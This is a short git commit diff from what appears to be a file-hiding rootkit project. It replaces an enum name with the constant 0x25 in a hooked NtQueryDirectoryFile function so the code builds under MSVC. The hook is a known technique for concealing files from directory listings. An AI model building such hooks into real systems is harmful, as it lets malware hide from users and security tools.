f82a483ee44642c6ab88c05a201c213825c1c50c
jungjin0003 <jungjin00031@gmail.com>
2021-07-08 10:49:27 +0900

    Edit msvc compiler error

--- src/64bit/FileHiding.c
+++ src/64bit/FileHiding.c
@@ -213,7 +213,7 @@ NTSTATUS NTAPI NewNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_
         PFILE_ID_BOTH_DIR_INFORMATION pCur = FileInformation;
         PFILE_ID_BOTH_DIR_INFORMATION pPrev = NULL;
 #elif _MSC_VER
-    if (FileInformationClass == FileIdBothDirectoryInfo)
+    if (FileInformationClass == 0x25)
     {
         PFILE_ID_BOTH_DIR_INFO pCur = FileInformation;
         PFILE_ID_BOTH_DIR_INFO pPrev = NULL;
